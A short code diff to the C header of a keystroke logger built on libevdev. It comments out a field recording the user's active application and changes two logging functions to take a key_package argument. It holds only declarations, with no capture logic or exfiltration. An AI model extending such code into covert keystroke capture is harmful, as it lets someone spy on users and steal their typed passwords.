@@ -29,8 +29,8 @@ typedef struct {
 typedef struct {
   char* key;         // A string representing a key that was pressed.
   char* timestamp;   // The approximate time (UTC) that the key was pressed.
-  char* application; /* Represents the active application of the user when they
-                        pressed the key. */
+  // char* application; /* Represents the active application of the user when they
+  //                       pressed the key. */
   int* time_pressed; /* The number of times the user held down the key; used for
                         approximating the number of characters that were
                         generated during this period. */
@@ -49,7 +49,7 @@ void end_keylogger(void);
 /**
  * Documentation here
  */
-void log_device(void);
+void log_device(key_package* key_package);
 
 /**
  * Documentation here
@@ -63,4 +63,4 @@ void handle_syn_dropped(struct libevdev* dev);
 /**
  * Documentation here
  */
-void log_keys(void);
+void log_keys(key_package* key_package);
